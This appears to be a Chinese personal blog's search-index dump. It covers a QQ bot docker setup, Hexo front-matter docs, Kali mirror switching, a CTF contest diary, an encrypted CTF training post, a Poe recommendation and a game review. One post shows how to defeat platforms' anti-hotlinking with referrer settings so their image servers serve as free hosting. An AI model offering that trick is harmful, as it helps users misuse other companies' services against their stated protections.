registry.cn-hangzhou.aliyuncs.com/moran233/nn:GZBOT    restart: always    environment:      - &quot;SEND_LIST=xxxxxxx&quot; #监听qq群号      - &#x27;GAME_LIST=&quot;xxxxx&quot;&#x27; #监听赛事名      - &quot;GZCTF_URL=xxxxxx&quot; #GZCTF网址      - &quot;GZ_USER=xxxxxx&quot; #GZCTF管理员用户名      - &quot;GZ_PASS=xxxxxxx&quot; #GZCTF管理员密码      - &#x27;SUPER=&quot;xxxxxxx&quot;&#x27; #机器人管理员qq号\n\n在当前目录执行（如果你是旧版 docker，可能需要加个短线 docker-compose up -d）\ndocker compose up -d\n\n查看 NapCatQQ 的 docker 日志，如果 查不到，先看一下自己的容器名称，以你自己实际容器名称为准，扫二维码登录 QQ 账号\ndocker logs napcat\n\n\n测试发现，两个容器有主从关系，我打算直接引入现有的 NapCatQQ 没成功，有师傅成功了可以借鉴一下\n\n查看日志测试这是 赛事机器人 的日志\n\n这是 NapCatQQ 的日志\n\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ","nonebot2"]},{"title":"【白嫖图床】利用各大厂商图片服务器做图床","url":"/posts/7e5bbd5c.html","content":"背景今天晚上突然在 QQ 聊天的时候发现的，因为我安装了 QQ 插件，QQ 图片可以直接转链接，于是脑海里萌生一个想法，既然这可以把图片转为链接，可不可以直接拿来当做图床，相比于市面上的小图床，这些大厂几乎没有跑路的可能性，并且没有存储空间的限制。拿来进行博客写作而且对清晰度以及水印无要求的话完全够用。\n下面我仔细说来\n常见可以托管图片的大厂平台有很多，比如 QQ 空间，QQ，微博，知乎，微信公众号，最右，CSDN，甚至是抖音……\n只要是可以托管图片的，都可以拿来用\n但是有个问题就是，有些平台做了图片防盗链，这时候需要经过处理才可以引用，而有些没有防盗链，这可以直接拿来用\n下面分类介绍\n几个平台QQ 图片缓存服务器（有防盗链）\nCSDN 图片服务器（有防盗链）\n微信公众号图片服务器（有防盗链）\n知乎图片服务器（未做防盗链）\n最右图片服务器（未做防盗链，但会 4.3）\n微博图片服务器（未做防盗链，但会 4.3）\n破解分析像没有防盗链的（比如上面的最右，微博，知乎），可以在平台方上传图片知乎复制链接直接拿来引用\n而做了防盗链的，如果不做一些手段，显示的是这样的图片\n（下面两张一样的图，上面来自微博，下面来自知乎）\n\n\n\n    Folding 测试： 点击查看更多 \n    \n      这时候就需要在你的 HTML 源码中添加下列代码引入\n&lt;meta name=&quot;referrer&quot; content=&quot;never&quot; /&gt;\n\n可以通过 inject，必须引入到 head 里面，而不是 body 里面，这行代码的解释如下：\n\n这段代码是在 HTML 文档中的元数据（meta data）部分，用于指定网页的 referrer 策略。referrer 是指用户在浏览器中点击链接时，浏览器发送给目标网页的信息，包括用户当前所在的页面的 URL。通常情况下，referrer 策略用来控制网页如何处理这些信息。\n在这段代码中，&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; 指定了 referrer 策略为 “never”，意味着当用户点击该网页上的链接时，浏览器不会发送 referrer 信息给链接指向的目标网页，而是会将 referrer 信息设置为 “no-referrer”。这样做可以增强用户的隐私保护，因为目标网页无法得知用户是从哪个页面跳转而来的。\n\n所以就绕过防盗链了\n\n    \n  \n\n由于原方法会导致站点统计等的数据丢失，经过吾爱大佬的解释，可以单独用图片的 img 标签\n可以直接给 &lt;img&gt; 标签加上 referrerpolicy = &quot;no-referrer&quot; 的属性，这样就不会影响站点统计。\n实际上微博的地址不固定，有时候会 403，知乎是比较稳定的，还有 QQ 直链比较方便\n实测知乎可用\nQQ 直链，微信公众号，CSDN 绕过后可用\n最右微博会遇到 403\n","categories":["技术教程","Hexo"],"tags":["Hexo","Hexo写作","图床","白嫖小技巧"]},{"title":"Hexo博文中front-matter的用法","url":"/posts/8217ff3e.html","content":"https://Hexo.io/zh-cn/docs/front-matter\nFront-matterFront-matter 是文件最上方以 --- 分隔的区域，用于指定个别文件的变量，举例来说：\n---title: Hello Worlddate: 2013/7/13 20:46:25---\n\n以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。\n\n\n\n参数\n描述\n默认值\n\n\n\nlayout\n布局\nconfig.default_layout\n\n\ntitle\n标题\n文章的文件名\n\n\ndate\n建立日期\n文件建立日期\n\n\nupdated\n更新日期\n文件更新日期\n\n\ncomments\n开启文章的评论功能\ntrue\n\n\ntags\n标签（不适用于分页）\n\n\n\ncategories\n分类（不适用于分页）\n\n\n\npermalink\n覆盖文章的永久链接，永久链接应该以 / 或 .html 结尾\nnull\n\n\nexcerpt\n纯文本的页面摘要。使用 该插件 来格式化文本\n\n\n\ndisableNunjucks\n启用时禁用 Nunjucks 标签 &#123;&#123; &#125;&#125;&#x2F;&#123;% %&#125; 和 标签插件 的渲染功能\nfalse\n\n\nlang\n设置语言以覆盖 自动检测\n继承自 _config.yml\n\n\npublished\n文章是否发布\n对于 _posts 下的文章为 true，对于 _draft 下的文章为 false\n\n\n布局根据 _config.yml 中 default_layout 的设置，默认布局是 post 。当文章中的布局被禁用(layout: false)，它将不会使用主题处理。然而，它仍然会被任何可用的渲染引擎渲染：如果一篇文章是用 Markdown 写的，并且安装了 Markdown 渲染引擎（比如默认的 Hexo-renderer-marked)，它将被渲染成HTML。\n除非通过 disableNunjucks 设置或 渲染引擎 禁用，否则无论布局如何，标签插件 总是被处理。\n分类和标签只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 Foo, Bar 不等于 Bar, Foo；而标签没有顺序和层次。\ncategories:- Diarytags:- PS3- Games\n\n\n分类方法的分歧\n如果您有过使用 WordPress 的经验，就很容易误解 Hexo 的分类方式。WordPress 支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是 Hexo 不支持指定多个同级分类。下面的指定方法：\ncategories:  - Diary  - Life\n\n会使分类 Life 成为 Diary 的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类。\n如果你需要为文章添加多个分类，可以尝试以下 list 中的方法。\ncategories:- [Diary, PlayStation]- [Diary, Games]- [Life]\n\n此时这篇文章同时包括三个分类： PlayStation 和 Games 分别都是父分类 Diary 的子分类，同时 Life 是一个没有子分类的分类。\n\nJSON Front-matter除了 YAML 外，你也可以使用 JSON 来编写 Front-matter，只要将 --- 代换成 ;;; 即可。\n&quot;title&quot;: &quot;Hello World&quot;,&quot;date&quot;: &quot;2013/7/13 20:46:25&quot;;;;","categories":["Hexo","文档"],"tags":["Hexo"]},{"title":"Kali如何切换源","url":"/posts/3073af94.html","content":"转载  \nhttps://blog.csdn.net/fingue/article/details/127096363\n1、进入vim模式sudo su进入root 模式vim &#x2F;etc&#x2F;apt&#x2F;sources.list编辑软件源配置文件\n随后进入vim模式\n2、国内源官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib#根据需要自己选一个，中科大的还可以#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#重庆大学#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib\n\n3、换源按“i”进行编辑\n将源插入后，点击“Esc”退出编辑，输入“：wq”回车保存退出，此处插入的是清华大学的源。\n注：“#”有注释本行的用途，可以先将原来的源进行注释，再插入新源\n4、随后输入下列命令行进行更新更新软件列表(非root权限在命令行前加“sudo”)\napt-get update 更新索引\napt-get upgrade 更新软件\napt-get dist-upgrade 升级\napt-get clean 删除缓存包\napt-get autoclean 删除未安装的deb包————————————————版权声明：本文为CSDN博主「不过教资不改名111」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/fingue/article/details/127096363\n","categories":["Linux","kali"],"tags":["Linux"]},{"title":"“曲star”网络安全技能竞赛——re方向培训讲解","url":"/posts/450391f2.html","content":"\n\n  04c094caff83ee4f17c88aca159bd79177f8ab826a62cda142e1faa450e9fced83f468f62b55d7459963a59c97c19971a7748172fd034bb2345ad82d5d9888168f4f3843b5243eb1e86649af3a869fd09098225ce8081083dbd300641d0aa41e8a9c8c0437028e32ba5f84be9249fa1fe9406ddf18a5dc486138a4110e73c9e9bcf09e7d7da670d729fefe6d1bb8a6d942de8d472a9c07f41ab7093e661675e5465e79d2889fcefb19fdc96b39dad330d0c788d601ddc405d44f482df7b02ed926127e74b3e1c188a4270ecf1ece945ef3c7b85c71363c7f06c510a77486b2c4ec5a8b1444d91f1034db610255918f759c36cc201386a81f23f7979c69b124927f6f6a10a17f431aacf53aed2195502907e3598a9937add19ddcaa602dc37bc192a45bfa6929aa4e975fb30640bcb9dcf83c2a6ba90d84a6ca66cd316f1d91a1f81bff5fe4389256e2d993f6fb46d486a73affd263abf9c427b6fdb6050c789c59369890a24f28c3456efdd02366060fe73567ad417429fa96f076da0606a55ce89f8e5e9029c64ddbf1fd98ffaaf692995f722be1ca4b5953afd7e28dfe054fcd7f01209cf209139a7be02eed2308d3debe026cfa0a05d43143eee56e388b97ea7e395e48f70ad99cadec8711db51d238e2b3f6c494bd2b4eabece8b16323749315b35f9147dce4ad12a7bf1807c5d52d1947280baf07f61dd531ca3d13ef3d10f426113501a7a3d5e060ce834683c63b804dea961c2354ae2973b471f71c0d7d5a0de4ed190636d2df51d93721992ad757a8c6c61db9c8b1795530ec5ef808ca7fa01717ce32f24da3d3134c149654fab00c5880eee993f7cac50be0458107ed33e725b6e423c33b78e7a1c34b3eceea2e8de1ae4dc29fd7c7105f436a3741689bde84887e707e361e7a4d01c3790da06f8a94659b7f5073deb773bbe99568e4092718d0d002687a7bacb98238cea38305b33adcc1586d4c849e653ea20bf6204e3f9dfc0b1109c49f45fde5a7481a4d9184c75ea2e85d980bbdce5fc75584075016d61df83984023dd5c05bb3241cadb3039a3cbd582b689d0cf70cfb851009154925e81f85c127246e2a7653f4b01cc00f7e5ac032e7e64066a64506a2b7ce0b46f7939793b9b93c5f7120fc69d7d9a0bc23e21090de77ac30067bbe801cf596699d5afc44a17613b1c59d3b2467dfaa69517fb18af2d8be5e6179a95e820a406dd03b13ecb94a00b9c64f90a25f09ab6d0901604e06e8ce5fcf5fb62684587de04e9e4f3d099cbbb9c2cd1d9f3baa44d4c5f1a30e4511c45a6e25f957e386df9ef8b4954d438332ab6e8edd50b08340195e3062fdff33324f23a7fee30322ddb26aa315afb097a71871f233eb36e28d9775f3e8571d84329d1f559495d0ab5abe4ee5ada5ef5dbe8797c4efc49724a6a165fc00c476388a01a6bb20d522957337f71e76bd0e0aefd4c7649208277193eb7311702c8e0f2a186b1de6087cffc3c3d90a4e8c00eeceb7e08b3dc67429e5c82e8faa9b7dee549dfa0d2d6c0118ff0867b9e952f5ebecb91a451ace2a576ccee302a136afe7de1a095c597c3a8fd13bdcc8b2f7286c5b53691b69603cf1b06180b402c272cfb00266ee77283a6d4da2dbad2a63883ff403c4dd2dc76c5fd2acb8133e3d9521bbffb7060b533601ee481c8dced3aaa398b1d4938d3e98e90e779397fa491e05351c3198e7dd12d9f96c09f40556dec5e9160169da33ce2f503645edae36236a6b38c1b43ab277c44ecdadd4930f39465e8afe0d13b6cfc0187d64904c0ecffc73fa3497fafaab11e752cd1eea8294d9daf82f3dece730263e73c530f46104e2b255be7ca5f4f667a7872f49815af04132d9370a0e4604dc806e87cce935887bbe0b075b4b6b02e2ffe995b9e100fc2769cf27c3ef8e8a546fb55b34093be8f76edc2a0702e41f2254a114e21a38088e489c53858b6a50c515775fe25f98230dd8242741d4339f60aab991ebc8781e36a8df7c03360d3c460045260fb823d731077128deb41db63938e017925ddb4c8b0ab82931302d0b79e194286845c17a72693507d39a045148d6cf89aa356072ea30d2f46bfec7ffa54b973877d7ab3729873a6ce4a006f5b553a17f75b14f2509aa6add5f5e21f626337c0a9678405395f8364935f77b7ee8c5f6bfcbf0e8f456e9f361ace40011fdb5e0c4a9c227418b7d4495457738d696d90255ce3630b3738dce9d709ae89a8e1ce1efbfe97b4048e24353136d8099af30be246624171defb4a593125325a15db705a0ee54ffd335116803ee7d9f5456af4c67290e572b50c2b8e9a43385204d1b187744069452343e3bd0d9a6b4d0acf78ac6e366fc70e5b2ea446716ddb3f18f83b34e9e987aedbe0e00f232b27de574f1cf23afbc29adbb81fdd2e6ba3efa7bb302b453f99acc3ebc7af09f181bc2851e50a7c1bc033114d6bd02c7533c4667f6581ccd29b68181bfbc9bf6659ba63d4f4dddb85ff07223b1bd2f56173b4e3baa814bf3c4a8f9ff170da1681690b93ccf214895e6c623102ae3433d719ece81364d051616a0749e37e2d7a31423f40721c8883d6b72cc6b88e77df3380c9c5ccfdd00b86189643c22dc867a07b4361d5f6b186b923696bd671fc811aaa916f623488e55a0f650e83ebbfbd8f8e44dc33e9e70cb07670363407ed0a223f54d0f7aa55ee15d0f316f25b9f2cb8bd25ce503d5d21aa2872ee069a932bbcbed88275117cc52c00f5bece3fceedfe1b7c243ee709a9f346874be0c4b644bd001ad1d653ca0555f1aa95ef951556a59549a8586209095ad5139bab1b9645c6df4da97d0fba0d87efa2ed270256e095484816a4dd04744ed63b5f2b96fc1a66316dc452727612a62427936e8c65c50d26adbe8ddcc3a22f5c08b08be48193cab72521becd6cd28afffb333f2d69ac40dffe042b3561e47898a94a165c6fa2b89daa803d9e3f8658e55b349b04ef413be1248b7e4a852496026279ff590a99ab99ad815509611f93b59fa6b0eaa6d422bbccd34fcc53689521e19c1da621860bcaa1ee88e198092d895d1bb55b82b8acb85338fc58ad7a9b1dcc72f19422e9cad29f920fd6c9dc88f186c9b3af990b6f782b92777b1e48ad3c46e86d6fb9f8dbbe44b968766e5486bb5c012ff9a82bd23193bc7d247625307dc57caa15de01f84ccfae1963d127c3f67417a325105530a9959ff007354774233e6dc48c52973020ad6e7162c5562b80ff6724fc084c5ff23985291d9166887a17ab21ff287762b889cd493fe7d8840190710ad97440e44c24646d271e85b12d4de863a198951c02a70c5830fc3dd59da1249b0ddf5ae9858d8c93b41a4c6b8b2f9a66317602691d799803ed3e04e9bd5fce29c485c2d82c980959db3b849733af295ad58e759137d9f2ff0778ffd7191f24b474348809059de2c917c66ff64f060c263144882751676862517a370c4f0b1fb58534fa94387b3ce6842cdb501c09e9ee37662f090c195ea299cea0f2a3c8e91856fcc00f504058f1c97d69725cccbbffa54b26c56098f98bdfd11df0fcb3e5bd96adeb05398aed92608e05178ff6b38c3b5722ec368771dd46463d729c5fd9855f78f71a6b1f7ae9290eeef1f0a473b89f643c8c0482bbdf58b769399ecc17334a6b053b8f7f2d194a449655656f3d2b85e97153ca287247f8ee64e1aa11e8d9d79be3333355b5d50b64e0eacb6a8a552ee948abe5076b947e27ce685288e8a91863cdd1a0cc7efd3ce8a331629cef062855b4759b68dce3b3b88a307389997a66c2aacce94b300d61cfc9ab301505e9d1d80aef4bf3f55f1c4e36e8d75347f8ca205ceec76d67e07f24baaffab514a5d7dbf4e9af474a6dee382d8c01275bb9d406c3698b3e36a61ddf3b064ebed18de6c49dea2302af7e4564684cded8bf4ee7e8cfcd1dd18bc391f45fc0580041e73373031121cbda10f91f0fed174f32a5379493e79e5b27cf2c4327a4f262308b1b62637ff4a7fae2fd420e5396549382b0d00186092f672693af0efcc9b008f873b31f5cffb69dad2b457650edb55e1f321028900fb12a37f0d6091bfc6e066fc7a8442e854cf160c5943882c76b99dd987b4f5cc734343b959619574eb76ff9cfd6a1e04b839c703c2eae9014d4969e501de5444bb897f2a04eba200568715b4624f6643c80434592a609714f7147072fae4b2eba8497d18ad3369a4f544da4cf9910b90b47a5829b4fc14c7a255cadb7e0821cf02060d7aae3b73b666d552516ae5b9258735c19ef8005442cdf3c6d1c5f492aaa6d6faf7268d0cb4d2c8f8375f3995d29cc675e79175c4d3c36ec7a8bc64aaaa229fda139b2bef600045020faa596db4601fa31fb7939e431607d3e17bf5b0f9798001e429ff03bc55456c2423c0db9aae489378024f3cf6e5214d469c4f2f525914e070377af758f0ee35fa3bf788aaad08dd01fd576b9a5f3e324f71737c9966b17cc1327507b7f00b18fba9582bce04a4ccd7f3263c48cda3b83e8e8c48bde28fbd4511f532d5f3dcb37f9b0be782081f3b66c33c20aa16c133096be4b4bccecc99b5a9fdafd5c86bd6761e9d83715b1c42264043649e4adc6285726efc2e4d23863f051ee6343d77864f32f7012291eece93b27f88d31164e8b2cfd101c1b25cecb5eb330f04441d41654efda0974ba9cb98f1f85674987cae9993a08dc15db0330d50608208fef3801d65c982313d52722f97c5c29e365d2bbee50f0a0a9a35a18c323f877aaa16bbae9c0e810e4c36b45256691d5a84736da06d769cd872bcbb9fec33fa2957cc6ecee1e99ee72aa58426b11d58b31bba051267cf63aa0e00bb119501c092c227fafd7256b182782eababb393ae8db0cac4fb2004de1401e24c4b3da8d43df58615923baab913f86e8691a39b0efe5e9912097c3101d1bdc6e641e61cfec5cfcb17e5186be0771c13eaf0f2a367dd58ce0d6add9af48aeb854dbd4739964d055c5397ab853f77c4786975634627f0185a5a70d7feddbc72200552c8b73a1c518a02fb68e4847c91dc71fe19f5f8b731de502da0edeb9467eb8c10bce5abe3baa6eadc3d171129c54a8cecbee19490fffad717c8a971c57bd562f0d219f44d0e86fb58c3721762f6066251e59a3eea0eacacfd2037caf536a6352285d267b02390ba9c9f0aaad5c973c4f870a0373b47560cf07427e7311c54f4c5b40c29ce6e32a7595d2a234e295b81e18241902317864f975541090415ce158e44b3d72d3a398f31c5510f1a6874c9d431767a0fbffe0f5c4af443f517d790b43b135fc4113a20e3d0ca5e701833b0eb0529e0109ff508fb92f651156e43e932abbfda5327cd7e41958cedc5824971f80abcf432363a66c6487298daa1afa83a2432349ee64074412d958bc24fb5aa5724f3ef9e3390a63c98d46b71e0e4b8815fde1375b3390bd3631c4f63a85fdc084cc148586b0d88feca288f4650ca41ace09f1e6608cb7d21dfa2b7287700d8594f3eb13c17d84633bcea7af0edb28bd0436d1818d743c2b219612542f344ef41ec87472447c7713380623cd38d960fd90e6d36070e75e5f0b63ff86f93\n  \n    \n      \n      \n        密码：QFNUCTF\n      \n    \n  \n\n\n\nimport {initHBE} from \"/js/plugins/hbe.js\";\n  console.log(\"hexo-blog-encrypt: loaded.\");\n    initHBE();\n\n","categories":["CTF","QFNUCTF"],"tags":["CTF","QFNU"]},{"title":"“科来杯”第十届山东省大学生网络安全技能大赛心得体会","url":"/posts/bacd5cfb.html","content":"START咕咕咕……好吧，比赛在10月22日就打完了，打完比赛就想写来着，但是一直咕到现在才有时间写这个心得体会\n太忙了啊啊啊啊啊~！！！\n收获还是很多的\n嘿嘿嘿被两位师哥带飞，满满的安全感\n10月21号下午跟两个师哥坐高铁，从曲阜到章丘，没走过远门的我还以为那是地铁，高铁来的声音很响我，轰隆隆的。\n高铁很快，不到三个小时我们就到章丘站了，下高铁之后有山东警察学院的志愿者带我们进学校，坐他们的志愿者大巴车去学校里面，大巴车嗡嗡的响\n做网络安全的，也有不少女生，但是也就几个，车上都在讨论学术知识，第一次到这种贤士云集的地方。\n到学校门口，我随手拍了几张照片\n\n非常好看！\n到了里面，学校已经为大赛准备的很好，我们先去报到处报道，领了参赛的东西\n一个参赛服，一个参赛选手证，一个鼠标垫，一个无线鼠标，还有一本参赛手册，两张餐券。\n然后进赛场调试设备，工作人员让我看看IP就行，当时我脑子就乱了，IP？什么IP，怎么看来着？急中生智想到了上周计网实验课刚学的ipconfig，好险，要不然就丢人了，好尴尬，当时工作人员就看着我。\n\n然后等报道完我们三个坐大巴车去酒店准备吃饭了\n酒店的饭，其实也还行，给餐券随便吃，也不算多豪华也还行倒是，(毕竟组委会包吃住，乐)\n吃完饭我们就去卧室准备睡觉了\n那边酒店在山脚下，信号贼差，发个消息发半天，当晚我们下载了网络安全法，数据安全法，密码法，国家安全法，个人信息保护法，反间谍法等条文，我在车上听到了别的师傅说一个随波逐流工具，我下载了发现非常好用，一把嗦。点赞这个工具\n然后就准备睡觉了，第二天要早起\n等第二天起来之后吃完饭就坐车走了，去了先去签到处放下书包，手机不能进场。领取了标签我就进场了\n考试时间从上午九点到下午四点，中途不间断，午饭在现场吃\n\n\n再说一下赛题吧，web题全场0解，一开始我看到签到题就蒙圈了，不过幸好，好在做出来了，不至于一个题也不会给队伍拖后腿\n然后过了半天，才做出简单编码，二进制八进制\n还有一个题是变异凯撒，那个题也应该会做的，但是当时只顾着用工具了，脑子没反应过来那是变异凯撒，不然早就知道了其实，这题不该失分，然后我应该去爱你这个题也不该失分，吃了没做过频谱图的题的亏，如果我当时做过频谱图的题就不至于不会做了，这几个题都是大部分人都会做的\n到了比赛后期就没什么新解出的，一直是老题在上升趋势，（不会是py吧（雾\n\n最后四点比赛结束，三等奖，差点二等奖了唉，唉三等奖，唉CTF，唉科来杯。\n然后遇到了王老师和李老师，两位带队老师，臧老师有事不能带了\n\n\n最后颁奖典礼宣布\n第十一届科来杯在曲阜师范大学主办，下一届我们就是主力军了，加油！\n\n总结还是得练！\n认识了日照校区的师傅（爷\n明年真是线下丹砂了\n练练练练，卷起来\nEND","categories":["CTF","比赛"],"tags":["CTF","科来杯"]},{"title":"【福音】我推荐你通过Poe来使用各大AI产品","url":"/posts/e7a38f19.html","content":"【福音】我推荐你通过 Poe 来使用各大 AI 产品今天下午在群里看到师哥（感谢林哥嘿嘿 ）推荐的一个 AI 平台，我尝试了一下，我的评价：很好。\n前期碎碎念首先我开篇点题推荐他的理由\n\n好处：\n\n注册简单，对新手很友好\n基础功能免费\n支持墙内邮箱，对注册邮箱无限制\n集成各大 AI 产品，目前本区域可用的不可用的都可以使用，比如 ChatGPT、Gemini-Pro、Claude-3、Qwen（通义千问）、Solar-Mini、RekaFlash、Mixtral 等等。\n\n缺点：\n\nfree 版有日限制次数，每个账户 3k 点询问数值，大约可以问几百次\n\n其他注意事项：\n\n高级版 AI 需要订阅，价格大约 20 刀&#x2F;月，其实 free 版对于一般用户来说足够了\n虽然日限制 3k 次，3k 次也不是小数目，如果实在不够的话，可以换账号继续用\n\n\n说了这么多了,开始正事,下面给出注册教程\n准备工作首先你需要准备:\n\n一个能浏览墙外学习资源的工具(这个我之前提到过了,可以看这个帖子注册)\n一个能收信发信的邮箱\n\n开始注册登陆官网首先挂上魔法,进入Poe 官网\n\n这里有很自由的注册方式,你可以通过 Google 邮箱,也可以通过 Apple 账号(我没试过),然后下面通过邮箱账号,可以是 outlook,甚至可以是 QQ 邮箱.\n我选择的是 Google 邮箱直接登录.\n开始使用成功之后就可以选择一个对话开始使用了，操作对新手及其的友好\n\n演示用Poe\n用官方ChatGPT\n\n除此之外还可以下载Android，Windows应用，整体体验还算不错\n","categories":["技术教程"],"tags":["ChatGPT","AI","Gemini-Pro","Claude-3"]},{"title":"《拣爱》游戏心得","url":"/posts/8af1abe8.html","content":"注:部分资料来自百度，部分图片来自知乎，游戏狗\n游戏介绍\n\n百度百科\n\n拣，有选择之意。游戏中每一个场景，每一个选择都合理而有其自己的意义。它还是一款谈论爱的游戏。希望通过游戏和故事，让玩家能够感受爱，学会爱他人和爱人的方法。\n这个游戏鼓励人们拥有一颗温暖柔软，善解人意的心。\n《拣爱》由三个独立故事构成。完整游玩一次游戏大概需要1.5小时。 \n总结对游戏的评价首先我想先写一下我对这个游戏的评价，游戏的可玩时间并不长，毕竟是剧情向游戏，剧情过完了就没得玩了，第二游戏的剧情做得非常好，能够引发玩家引起共鸣和无限的思考，我更觉得它像是一种艺术，就像一千个人眼中有一千个哈姆雷特一样，我对游戏其中的剧情的思考有一些我也问过原作者，而原作者的回答是纯主观想法，无标准答案。是的，艺术的意义便是这样。\n这个游戏引发出来的我的思考游戏一共分三章，第一章讲的是恋爱过程中的情侣，第二章讲的是两个青梅竹马的分分合合，第三章讲的是已婚夫妻的朝夕相处\n虽然我是牡丹solo，但是对我的触动也是很深刻的\n第一章是我印象最深的一章，也许是因为我正处于这么一个年龄段，所引发的共鸣比较多\n游戏有存档，但爱没有存档，游戏可以回档，爱不能重来\n每个人都拥有爱的能力，每个人都值得被爱\n游戏中有很多操作是不被告知的，比如有的剧情要等着，有的剧情要点击小物品，而不是只点明显的选项而已，爱也是一样，有时候并不能思维定式，只看选项，而更多的是爱情中的不确定\n我的游戏历程第一章一、相遇、相知、相识\n我是一个游戏开发者，今天参加了一个gamejam活动。\n（注：GameJam是一个游戏开发活动，参加者自由组队，48小时内围绕指定的主题进行创作，从零开始完成一款游戏)\n传闻中gamejam现场可以偶遇女生一起组队，但偏偏我们组却是全男班\n活动在一个周五的下午开始，大部分队伍都会把第一天夜晚用来进行整个游戏的构思和设计工作。\n而我们组的讨论进行得十分顺利。在方案基本定下来以后，我也放松紧绷的神经，开始环顾会场四周。\n这时候，我留意到她的存在。她所在的小组就坐在我们隔壁\n他们组好像还在激烈的讨论。我听到他们其中一个队员说:大家先休息10分钟，之后再回来继续讨论吧。\n她的队友都纷纷离开了座位，留下她一个人在本子上写写画画\n”现在是个和她说话的好机会。“我心想\n我简单整理了一下仪表仪容，在脸上挤出一个自认为最好的表情\n鼓足勇气，走到她的身旁\n\n\n第一次玩这是第一个对话选项，第一个选项相比而言还是比较自然的，第二个有有点显得高傲自大，像是很夸赞很吹嘘自己的想法，我不喜欢，所以我选择了第一个\n\n她仿佛面有难色。但依然礼貌地介绍了自己:…“嗨，我叫000.“\n\n其实你向我搭讪的时候，我内心是拒绝的。大概是因为给我感觉很不自然吧\n第二次玩由于结局提示这边选错了，所以无奈我选了另一个，但是结局还是有错，我觉得有蹊跷，鼠标移动到屏幕才发现画框可以点，点击场景中的海报，才能走向正确剧情\n\n“这次GameJam的题目不错，很有趣。”\n“是啊，我觉得图中男女相互纠缠，可以做一个和恋爱相关的游戏”\n“恋爱游戏啊…我觉得挺适合的。这次的题目或许还有一个意思:‘一件事情总有你意想不到的另一面。’”\n“我也是这么想的，如果把这层意思放进恋爱游戏里或许会很有趣吧”\n“对了，我们还可以…”\n不知不觉，我们聊了很久。可惜的是她的队友最后还是没有采用她的建议\n而这也是她后来告诉我的\n\n\n两个兴趣相同的人有共同话题，这样才是最好的搭讪方式，不是吗？\n\n二、第一次约会前的准备\nGameJam活动结束后，我通过活动的微信群找到了她\n开始大家都有些拘谨，但很快我们就成为了相互倾诉生活琐事的”笔友\n朋友都说我虽然在GameJam上没获奖，但却是所有人中唯一中了大奖的\n我没法反驳，因为我真的太幸运了。\n两周后的一天，我们在微信上聊着\n而我一直想找机会把她约出来一起看个电影，吃个饭\n\n\n第二个对话选项，虽然这个对话选什么都不影响结局，但还是第一个选项更好一些，第一个选项更适合来安慰对方，而第二个选项传达出来的意思就好像是她确实是做错了，但第一个就能传达出其实大家都这样，你没错，是上司的原因的意思，更好一些\n\n安慰别人的时候不要把错误说到对方身上\n\n后面紧跟着的对话刚刚一样，与上面同理，选第一个\n男主开始尝试约女主出来玩\n\n自然地进行，不要带着目的做事\n需要关注女孩子的朋友圈昂，才能知道女孩子的兴趣\n和女孩子出来玩不能只看电影啊~不还得吃点东西吗\n\n这里有个细节，就是朋友圈里传达出来两个信息，“女主是猫尔摩斯的真爱粉”和“喜欢吃火锅”，这两个信息是推动剧情的关键点\n\n\n然后后面有个小游戏，中间会有弹窗来分散你的注意力\n\n和女孩子约会怎么能分心呢！\n\n三、看完电影吃饭\n终于到了和她见面的日子\n第一次和她看电影，不免有些紧张\n但我还是告诉自己要尽量把注意力放在电影上面\n电影放映完之后，我们在椅子上留到了最后\n“刚刚的电影还挺精彩的”\n”虽然和原著有些出入，但是看得出导演为了拍出原著的味道很用心!太精彩了!“\n“不枉我期待这电影这么久!”\n“我们接着去哪里?”\n“这附近的话，我知道有家不错的店。”当然是选择她最喜欢吃的火锅啦~\n\n\n四、约会后的闲聊\n月光在她的脸上勾画出一道银白色的轮廓\n看着她的脸，走在旁边的我内心有点不安分了起来\n两人的距离越走越近，就算不说出口，两人之间也早已经有了默契\n我还需要开口说些什么吗?\n\n\n第一次玩这里有三个选项，“我喜欢你”，“我能牵着你的手吗？”，“月色真美”\n第一个选项未免有些太直接了，第二个选项也有点尴尬，于是我选择了第三个\n第二次玩由于后面结局的提示这边选错了\n所以这边我第二次直接选了第二个选项，“我能牵着你的手吗”\n但还是错了\n第三次玩第三次玩才知道屏幕可以点，我才明白是点男女主的手！\n\n这一刻，或许任何言语，都是多余。\n我们就这样开始了。\n\n\n有时无言胜过千言万语，男孩子只要出手就好了！\n\n五、无话不聊的甜蜜期\n我们就这样开始了\n我们之间仿佛有聊不完的话题\n只要找到能够挑起话题的东西，我们都绝对不会放过\n我们渴望了解对方，恨不得把镜头拉近，对焦到对方心里面去看对方心底在想什么。\n\n\n第一次玩这里只有一个选项，第一次玩只好点选项了因为没得选\n经过结局的提示才知道这边操作错了\n“但是我们的话题往往只能停留于表面。其实，我一直希望能与你分享更深层的想法”\n第二次玩第二次玩因为有了之前的经验了，所以我觉得这边肯定是有东西可以点的，结合屏幕发现男女主都有同类的物品，所以应该是共同话题以此点击六个物品之后点了选项，发现还是提示不完美\n第三次玩这边我猜着应该是有深层义，但是我不知道怎么操作，在往上查了才知道是滑动鼠标滚轮，会出现六个idea。\n\n找到六个每两个一一对应就可以触发完